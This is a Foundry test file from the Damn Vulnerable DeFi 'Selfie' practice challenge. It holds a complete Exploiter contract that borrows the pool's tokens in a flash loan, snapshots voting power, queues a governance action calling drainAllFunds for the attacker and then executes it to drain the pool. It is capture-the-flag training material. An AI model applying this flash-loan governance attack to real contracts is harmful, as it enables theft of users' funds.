// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
    
        Exploiter exploiter = new Exploiter(
            simpleGovernance,
            selfiePool,
            dvtSnapshot,
            attacker
        );
        exploiter.attack();
        vm.warp(block.timestamp + 2 days);
        exploiter.drainFunds();
    
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Exploiter {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvt;
    address attacker;
    uint256 targetActionId;

    constructor(
        SimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _dvt,
        address _attacker
    ) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvt = _dvt;
        attacker = _attacker;
    }

    function attack() external {
        dvt.snapshot();
        uint256 flashloanAmount = dvt.balanceOf(address(selfiePool));
        selfiePool.flashLoan(flashloanAmount);
    }

    function drainFunds() external {
        simpleGovernance.executeAction(targetActionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        dvt.snapshot();
        targetActionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        dvt.transfer(msg.sender, amount);
    }
}
